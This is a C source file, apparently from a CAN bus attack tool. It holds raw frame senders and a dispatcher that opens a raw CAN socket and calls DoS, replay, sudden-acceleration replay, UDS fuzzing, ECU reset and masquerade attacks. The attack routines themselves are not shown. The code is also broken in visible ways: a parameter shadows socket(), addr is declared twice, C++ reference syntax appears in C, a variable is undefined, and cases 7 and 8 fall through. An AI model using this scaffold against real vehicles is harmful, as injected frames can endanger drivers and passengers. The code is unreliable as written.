#include "all_headers.h"

void send_can_packet_showpayload(int socket, struct sockaddr_can *addr, unsigned char *data, int length, int can_id) {
    struct can_frame frame;
    frame.can_id = can_id;
    frame.can_dlc = length;
    memcpy(frame.data, data, length);

    if (sendto(socket, &frame, sizeof(struct can_frame), 0, (struct sockaddr *)addr, sizeof(*addr)) != sizeof(struct can_frame)) {
        perror("CAN packet send failed");
    } else {
        printf("CAN packet sent with ID: 0x%X, Data: ", can_id);
        for (int i = 0; i < length; i++) {
            printf("0x%02X ", data[i]);
        }
        printf("\n");
    }
}

void send_can_packet_sendonly(int socket, struct sockaddr_can *addr, unsigned char *data, int length, int can_id) {
    struct can_frame frame;
    frame.can_id = can_id;
    frame.can_dlc = length;
    memcpy(frame.data, data, length);

    if (sendto(socket, &frame, sizeof(struct can_frame), 0, (struct sockaddr *)addr, sizeof(*addr)) != sizeof(struct can_frame)) {
        perror("CAN packet send failed");
    } else {}
}

void attack_packet_sender(int socket, struct sockaddr &addr, int attack_code, int canid, int time_diff) {
    int s;
    struct sockaddr_can addr;
    struct ifreq ifr;

    if ((s = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0) {
        perror("Socket creation error");
        exit(1);
    }

    //set interface name
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) {
        perror("SIOCGIFINDEX error");
        close(s);
        exit(1);
    }

    //set socket address
    addr.can_family = AF_CAN;
    addr.can_ifindex = ifr.ifr_ifindex;

    //socket binding
    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("Socket binding error");
        close(s);
        exit(1);
    }

    //call attack-functions
    // dos, replay, fuzzing, suspension, msq
    switch (attack_code) {
        case 1:
            dos_dos(s, &addr, canid);
            break;
        case 2:
            replay_replay(s, &addr, canid);
            break;
        case 3:
            replay_suddenaccel(s, &addr, canid);
            break;
        case 4:
            fuzzing_find_uds(s, &addr, canid);
            break;
        case 5:
            fuzing_random_canid(s, &addr, canid);
            break;
        case 6:
            fuzzing_random_payload(s, &addr, canid);
            break;
        case 7:
            suspension_resetecu(s, &addr, canid);
        case 8:
            msq_msq(s, &addr, canid);

        default:
            printf("Invalid attack code\n");
            break;
    }

    close(s);
}

